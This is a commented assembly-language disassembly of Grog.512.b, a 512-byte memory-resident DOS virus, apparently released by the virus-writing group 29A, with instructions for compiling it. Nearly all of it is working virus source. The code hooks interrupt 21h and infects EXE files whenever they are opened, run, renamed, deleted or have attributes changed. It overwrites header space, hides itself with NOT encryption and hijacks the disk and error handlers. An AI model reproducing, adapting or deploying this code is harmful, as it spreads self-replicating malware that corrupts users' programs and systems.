comment *
                               Grog.512.b              млллллм млллллм млллллм
                             Disassembly by            ллл ллл ллл ллл ллл ллл
                              Darkman/29A               мммллп плллллл ллллллл
                                                       лллмммм ммммллл ллл ллл
                                                       ллллллл ллллллп ллл ллл

  Grog.512.b is a 512 bytes resident EXE virus. Infects files at open file,
  delete file, get or set file attributes, load and/or execute program and
  rename file, by overwriting the unused space in the EXE header with the
  virus. Grog.512.b has an error handler and a 8-bit logical NOT encryption in
  file. Grog.512.b is using the interrupt 2fh (multiplex) set disk interrupt
  handler DOS exploit.

  I would like to thank SlageHammer for providing me the binary of this virus.

  Compile Grog.512.b with Turbo Assembler v 4.0 by typing:
  TASM /M GROG512B.ASM
  TLINK /t /x GROG512B.OBJ
*

.model tiny
.code
 org    100h                             ; Origin of Grog.512.b

code_begin:
header_begin:
call_imm16   equ     word ptr $+01h      ; CALL imm16
	     call    first_genera
crypt_begin:
	     mov     ah,0a6h             ; Grog.512.b function
	     int     21h
	     cmp     al,03h              ; Already resident?
	     je      virus_exit          ; Equal? Jump to virus_exit

	     mov     ax,3521h            ; Get interrupt vector 21h
	     int     21h
	     mov     word ptr [int21_addr],bx
	     mov     word ptr [int21_addr+02h],es

	     mov     ax,ds:[02h]         ; AX = segment of first byte beyon...
	     mov     cx,(code_end-code_begin+0fh)/10h+11h
	     sub     ax,cx               ; AX = segment of first byte beyon...
	     mov     ds:[02h],ax         ; Store segment of first byte beyo...

	     push    ax                  ; Save AX at stack
	     mov     cx,cs               ; CX = code segment
	     sub     ax,cx               ; AX = size of memory block in par...
	     dec     cx                  ; CX = segment of current Memory C...
	     mov     ds,cx               ; DS =    "    "     "      "     "
	     mov     ds:[03h],ax         ; Store size of memory block in pa...
	     pop     es                  ; Load ES from stack (AX)

	     push    cs                  ; Save CS at stack
	     pop     ds                  ; Load DS from stack (CS)

	     xor     si,si               ; Zero SI
	     xor     di,di               ; Zero DI
	     mov     cx,(code_end-code_begin)+100h
	     rep     movsb               ; Move the virus to top of memory

	     lea     dx,int21_virus      ; DX = offset of int21_virus

	     push    es                  ; Save ES at stack
	     pop     ds                  ; Load DS from stack (ES)

	     mov     ax,2521h            ; Set interrupt vector 21h
	     int     21h

	     push    cs cs               ; Save segments at stack
	     pop     ds es               ; Load segments from stack
virus_exit:
	     nop

	     lea     di,buffer           ; DI = offset of buffer
	     push    di                  ; Save DI at stack

	     mov     bx,di               ; BX = offset of buffer
	     lea     si,restore          ; SI = offset of restore
	     mov     cl,(restore_end-restore)

	     mov     byte ptr [jmp_imm32],11101010b

	     mov     ax,ds               ; AX = segment of PSP for current ...
	     add     ax,10h              ; AX = segment of beginning of code
	     add     word ptr [data_buffer+0eh],ax

	     add     ax,word ptr [data_buffer+06h]

	     rep     movsb               ; Move restore procedure to end of...

	     mov     dx,word ptr [data_buffer]
	     mov     cl,04h              ; Multiply by paragraphs
	     shl     dx,cl               ; DX = headersize

	     mov     si,100h             ; SI = offset of beginning of code
	     mov     di,si               ; DI =   "    "      "     "   "
	     add     si,dx               ; SI = segment of beginning of code

	     mov     cx,bx               ; CX = offset of buffer
	     sub     cx,si               ; CX = number of bytes to move

	     ret                         ; Return!

restore      proc    near                ; Restore the infected file
	     cli                         ; Clear interrupt-enable flag

	     mov     ss,ax               ; SS = initial SS relative to start of ...
	     mov     sp,word ptr [data_buffer+08h]
	     sti                         ; Set interrupt-enable flag

	     repe    movsb               ; Move the original code to beginning

	     jmp     jmp_imm32

jmp_imm32    equ     $+0bh               ; JMP imm32 (opcode 0eah)
data_buffer:
	     dw      (header_end-header_begin)/10h
	     dw      00h,0ffffh          ; Minimum-, maximum number of para...
	     dw      00h,00h             ; Initial CS:IP relative to start ...
	     dw      ?                   ; Checksum
	     dw      00h,00h             ; Initial SS:SP relative to start ...
	     db      'ENMITY v2.1 (C) ''93 by GROG - Italy'
restore_end:
	     endp
infect_file:
	     cld                         ; Clear direction flag

	     push    ax bx cx dx si di ds es

	     mov     di,ds               ; DI = segment of filename

	     cmp     ah,6ch              ; Extended open/create?
	     je      extende_open        ; Equal? Jump to extende_open

	     mov     si,dx               ; SI = offset of filename
extende_open:
	     mov     ax,3524h            ; Get interrupt vector 24h
	     int     21h
	     push    bx es               ; Save registers at stack

	     mov     al,13h              ; Get interrupt vector 13h
	     int     21h
	     push    bx es               ; Save registers at stack

	     mov     ah,13h              ; Set disk interrupt handler
	     int     2fh

	     mov     ax,2513h            ; Set interrupt vector 13h
	     int     21h

	     mov     ah,13h              ; Set disk interrupt handler
	     int     2fh

	     push    cs                  ; Save CS at stack
	     pop     ds                  ; Load DS from stack (CS)

	     lea     dx,int24_virus      ; DX = offset of int24_virus
	     mov     ax,2524h            ; Set interrupt vector 24h
	     int     21h

	     mov     ds,di               ; DS = segment of filename
	     mov     dx,si               ; DX = offset of filename
find_zero:
	     lodsb                       ; AL = byte of filename
	     cmp     al,00h              ; End of filename?
	     jne     find_zero           ; Not equal? Jump to find_zero

	     sub     si,05h              ; SI = offset of the dot in filename
	     lodsb                       ; AL = dot in the filename
	     cmp     al,'.'              ; Dot?
	     jne     infect_exit         ; Not equal? Jump to infect_exit

	     lodsw                       ; AX = two bytes of file extension
	     and     ah,01011111b        ; Upcase character
	     cmp     ah,'X'              ; EXE executable?
	     jne     infect_exit         ; Not equal? Jump to infect_exit

	     xor     cx,cx               ; CX = new file attributes
	     mov     ax,4301h            ; Set file attibutes
	     pushf                       ; Save flags at stack
	     call    cs:[int21_addr]

	     mov     ax,3d02h            ; Open file (read/write)
	     pushf                       ; Save flags at stack
	     call    cs:[int21_addr]
	     jnc     get_file_inf        ; No error? Jump to get_file_inf
infect_exit:
	     jmp     infect_exit_
get_file_inf:
	     xchg    ax,bx               ; BX = file handle

	     push    cs cs               ; Save segments at stack
	     pop     ds es               ; Load segments from stack

	     mov     ax,5700h            ; Get file's date and time
	     int     21h
	     push    cx dx               ; Save registers at stack

	     lea     dx,data_buffer      ; DX = offset of data_buffer
	     mov     ah,3fh              ; Read from file
	     mov     cx,08h              ; Read eight bytes
	     int     21h

	     cmp     byte ptr [data_buffer],'M'
	     je      exam_buffer         ; Found EXE signature? Jump to exa...
	     cmp     byte ptr [data_buffer],'Z'
	     je      exam_buffer         ; Found EXE signature? Jump to exa...
close_file:
	     pop     ax ax               ; Load registers from stack

	     jmp     close_file_
exam_buffer:
	     cmp     word ptr [data_buffer+06h],00h
	     jne     close_file          ; Relocation entries? Jump to clos...

	     mov     ah,3fh              ; Read from file
	     mov     cl,10h              ; Read sixteen bytes
	     lea     dx,data_buffer      ; DX = offset of data_buffer
	     mov     si,dx               ; SI =   "    "       "
	     int     21h

	     lodsw                       ; AX = header size in paragraphs
	     cmp     ax,20h              ; EXE header too small?
	     jae     exam_filesiz        ; Above or equal? Jump to exam_fil...

	     jmp     close_file
exam_filesiz:
	     mov     al,02h              ; Set current file position (EOF)
	     call    set_file_pos

	     or      dx,dx               ; Filesize too large?
	     jnz     close_file          ; Not zero? Jump to close_file
	     cmp     ax,400h             ; Filesize too small?
	     jb      close_file          ; Below? Jump to close_file
	     cmp     ax,offset max_filesize
	     ja      close_file          ; Above? Jump to close_file

	     mov     al,00h              ; Set current file position (SOF)
	     call    set_file_pos

	     call    crypt_write

	     pop     dx cx               ; Load registers from stack
	     mov     ax,5701h            ; Set file's date and time
	     int     21h
close_file_:
	     mov     ah,3eh              ; Close file
	     int     21h
infect_exit_:
	     pop     ds dx               ; Load registers from stack
	     mov     ax,2513h            ; Set interrupt vector 13h
	     int     21h

	     pop     ds dx               ; Load registers from stac
	     mov     al,24h              ; Set interrupt vector 24h
	     int     21h

	     pop     es ds di si dx cx bx ax

	     jmp     int21_exit

	     db      '>>7/93<<'

set_file_pos proc    near
	     mov     ah,42h              ; Set current file position
	     xor     cx,cx               ; CX:DX = offset from origin of ne...
	     cwd                         ;   "   "   "     "     "    "    "
	     int     21h

	     ret                         ; Return!
	     endp
infect_file_:
	     jmp     infect_file

crypt_write  proc    near                ; Encrypt code, write to file, dec...
	     mov     ah,40h              ; Write to file
	     lea     dx,code_begin       ; DX = offset of code_begin

	     call    not_cryptor
crypt_end:
	     mov     cx,(code_end-code_begin)
	     int     21h

	     call    not_cryptor

	     ret                         ; Return!
	     endp

not_cryptor  proc    near                ; 8-bit logical NOT encryptor/decry...
	     lea     si,crypt_begin      ; SI = offset of crypt_begin
	     mov     di,si               ; DI =   "    "       "
	     mov     cx,(crypt_end-crypt_begin)
crypt_loop:
	     lodsb                       ; AL = byte of plain/encrypted code
	     not     al                  ; Encrypt/decrypt byte of code
	     stosb                       ; Store byte of encrypted/decrypte...

	     loop    crypt_loop

	     ret                         ; Return!
	     endp

int21_virus  proc    near                ; Interrupt 21h of Grog.512.b
	     cmp     ah,0a6h             ; Grog.512.b function?
	     jne     tst_function        ; Not equal? Jump to tst_function

int24_virus  proc    near                ; Interrupt 24h of Grog.512.b
	     mov     al,03h              ; Fail system call in progress

	     iret                        ; Interrupt return!
	     endp
tst_function:
	     cmp     ah,4bh              ; Load and/or execute program?
	     je      infect_file_        ; Equal? Jump to infect_file_
	     cmp     ah,3dh              ; Open file?
	     je      infect_file_        ; Equal? Jump to infect_file_
	     cmp     ah,56h              ; Rename file?
	     je      infect_file_        ; Equal? Jump to infect_file_
	     cmp     ah,43h              ; Get or set file attributes?
	     je      infect_file_        ; Equal? Jump to infect_file_
	     cmp     ah,41h              ; Delete file?
	     je      infect_file_        ; Equal? Jump to infect_file_
	     cmp     ax,6c00h            ; Extended open/create?
	     je      infect_file_        ; Equal? Jump to infect_file_
int21_exit:
	     db      11101010b           ; JMP imm32 (opcode 0eah)
int21_addr   dd      ?                   ; Address of interrupt 21h
	     endp
header_end:
code_end:
	     mov     ax,4c00h            ; Terminate with return code
	     int     21h

first_genera proc    near                ; First generation
	     mov     [call_imm16],offset not_cryptor

	     ret                         ; Return!
	     endp

	     db      0e754h dup(?)
max_filesize:
	     db      10ah dup(?)
buffer	     db      (restore_end-restore) dup(?)
data_end:

end	     code_begin
